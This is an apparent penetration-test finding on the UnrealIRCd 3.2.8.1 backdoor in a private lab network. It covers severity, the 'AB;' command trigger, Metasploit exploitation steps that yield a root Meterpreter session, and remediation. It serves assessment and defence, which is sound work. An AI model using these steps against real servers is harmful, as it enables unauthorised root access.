# Finding F03: UnrealIRCd 3.2.8.1 Backdoor Remote Code Execution (RCE)

## Vulnerability Overview
* **Target:** 192.168.56.20:6667
* **Service:** IRC (UnrealIRCd 3.2.8.1)
* **Severity:** Critical (CVSS 10.0)
* **Impact:** Unauthenticated Remote Code Execution yielding root privileges.
* **MITRE ATT&CK:** T1190 - Exploit Public-Facing Application

## Technical Description
UnrealIRCd version 3.2.8.1 contained an unauthorized backdoor in its source code distribution. Sending specific commands ending with `AB;` allows unauthenticated attackers to execute arbitrary system commands with the privileges of the running daemon (`root`).

## Exploitation Proof
1. Loaded `exploit/unix/irc/unreal_ircd_3281_backdoor` in Metasploit.
2. Set `RHOSTS` to `192.168.56.20` and `LHOST` to `192.168.56.10`.
3. Executed `exploit`, which successfully established a Meterpreter session.
4. Ran `getuid`, confirming `root` system privileges.

## Remediation
* Upgrade `UnrealIRCd` to the latest release or build from verified source code.
* Re-verify system image hashes against official release checksums.
* Restrict IRC port 6667 via internal firewall rules.
